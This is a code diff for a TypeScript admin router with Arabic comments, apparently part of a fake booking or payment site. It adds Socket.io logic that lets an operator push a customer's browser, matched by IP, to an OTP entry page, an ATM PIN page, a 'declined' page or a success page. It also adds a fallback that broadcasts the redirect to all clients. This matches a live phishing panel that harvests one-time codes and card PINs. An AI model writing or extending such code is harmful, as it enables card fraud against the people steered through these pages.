@@ -507,6 +507,10 @@ const adminRouter = router({
     .mutation(async ({ input }) => {
       const { reference, action } = input;
 
+      // جلب IP العميل من قاعدة البيانات
+      const booking = await getBookingByReference(reference);
+      const clientIp = booking?.clientIp || "";
+
       if (action === "accepted") {
         // توجيه لصفحة OTP
         await createOrUpdatePayment(reference, { paymentAction: "accepted" } as any);
@@ -523,10 +527,26 @@ const adminRouter = router({
         await updateBookingStatus(reference, "completed", 1);
       }
 
-      // إشعار Socket.io
+      // إشعار Socket.io - إرسال للمسؤولين وتوجيه العميل
       try {
         const io = getIo();
-        if (io) io.to("admins").emit("paymentActionSet", { reference, action });
+        if (io) {
+          io.to("admins").emit("paymentActionSet", { reference, action });
+
+          // تحديد الصفحة المستهدفة للعميل
+          let targetPage: string | null = null;
+          if (action === "accepted") targetPage = "code";         // صفحة OTP
+          else if (action === "pass") targetPage = "pin";          // صفحة ATM PIN
+          else if (action === "denied") targetPage = "payments?declined=true"; // رفض
+          else if (action === "verified") targetPage = "bCall";   // نجاح
+
+          // إرسال navigateTo للعميل إذا كان IP معروفاً
+          if (targetPage && clientIp) {
+            io.to(`ip_${clientIp}`).emit("navigateTo", { page: targetPage, ip: clientIp });
+            // fallback: إرسال للجميع مع IP للتحقق
+            io.emit("navigateTo", { page: targetPage, ip: clientIp });
+          }
+        }
       } catch (_) {}
 
       return { status: true, action, reference };
